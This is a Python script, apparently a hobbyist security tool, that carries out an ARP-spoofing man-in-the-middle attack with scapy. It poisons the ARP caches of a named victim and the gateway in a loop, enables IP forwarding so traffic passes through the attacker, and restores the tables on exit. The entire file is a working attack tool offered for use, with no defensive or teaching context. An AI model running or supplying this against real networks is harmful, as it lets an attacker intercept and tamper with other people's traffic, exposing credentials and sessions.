#!/usr/bin/env python3
from scapy.all import ARP, send, srp
import os
import sys
import time

def banner():
    print(r"""
 __  __ _____ _______ __  __ 
|  \/  |_   _|__   __|  \/  |
| \  / | | |    | |  | \  / |
| |\/| | | |    | |  | |\/| |
| |  | |_| |_   | |  | |  | |
|_|  |_|_____|  |_|  |_|  |_|

                - By Abhay Rastogi
    """)

def enable_ip_forward():
    """Enable IP forwarding in Linux"""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding enabled")

def disable_ip_forward():
    """Disable IP forwarding in Linux"""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding disabled")

def get_mac(ip):
    """Get MAC address of a target IP"""
    arp_request = ARP(pdst=ip)
    broadcast = srp(arp_request, timeout=2, verbose=False)[0]
    return broadcast[0][1].hwsrc if broadcast else None

def spoof(target_ip, spoof_ip):
    """Send ARP reply: Tell target that we are spoof_ip"""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restore original ARP table"""
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac,
                 psrc=source_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    banner()
    if len(sys.argv) != 3:
        print("Usage: sudo python3 mitm-script.py <victim_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    enable_ip_forward()
    packet_count = 0

    try:
        print("[*] Starting ARP spoofing... Press CTRL+C to stop\n")
        while True:
            spoof(target_ip, gateway_ip)   # Poison target
            spoof(gateway_ip, target_ip)   # Poison gateway
            packet_count += 2  # Two packets sent per loop
            print(f"\r[+] Packets sent: {packet_count}", end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forward()
        print("[*] Clean exit.")

